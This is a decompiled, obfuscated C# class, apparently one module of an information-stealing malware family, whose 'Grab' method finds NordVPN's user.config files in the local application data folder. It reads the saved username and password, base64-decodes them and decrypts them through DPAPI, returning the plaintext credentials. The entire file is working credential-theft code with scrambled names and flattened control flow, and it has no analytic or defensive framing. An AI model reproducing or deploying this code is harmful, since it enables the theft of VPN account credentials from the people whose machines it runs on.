using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Xml;
using SNt;
using p3N5Y;

namespace ZAZUx;

public class GSiK3L3WMyH : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string xSN2Gbj
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public GSiK3L3WMyH()
	{
		xSN2Gbj = "NordVPN";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string folderPath = default;
		DirectoryInfo directoryInfo = default;
		List<ii68> list = default;
		do
		{
			if (num == 2)
			{
				folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				num = 3;
			}
			if (num == 4)
			{
				if (directoryInfo.Exists)
				{
					break;
				}
				num = 5;
			}
			if (num == 3)
			{
				directoryInfo = new DirectoryInfo(Path.Combine(folderPath, "NordVPN"));
				num = 4;
			}
			switch (num)
			{
			case 5:
				return list;
			case 1:
				list = new List<ii68>();
				num = 2;
				break;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 6);
		DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			DirectoryInfo[] directories2 = directoryInfo2.GetDirectories();
			foreach (DirectoryInfo directoryInfo3 in directories2)
			{
				string text = Path.Combine(directoryInfo3.FullName, "user.config");
				if (!File.Exists(text))
				{
					continue;
				}
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(text);
					string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
					string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
					if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2))
					{
						list.Add(new ii68
						{
							S8v = ctLlKJA7.Lbl(Convert.FromBase64String(innerText), (DataProtectionScope)1),
							_9H5rP7hg2 = ctLlKJA7.Lbl(Convert.FromBase64String(innerText2), (DataProtectionScope)1),
							oVAe = "NordVPN",
							byIdLuuGZbL = "-"
						});
					}
				}
				catch
				{
				}
			}
		}
		return list;
	}
}
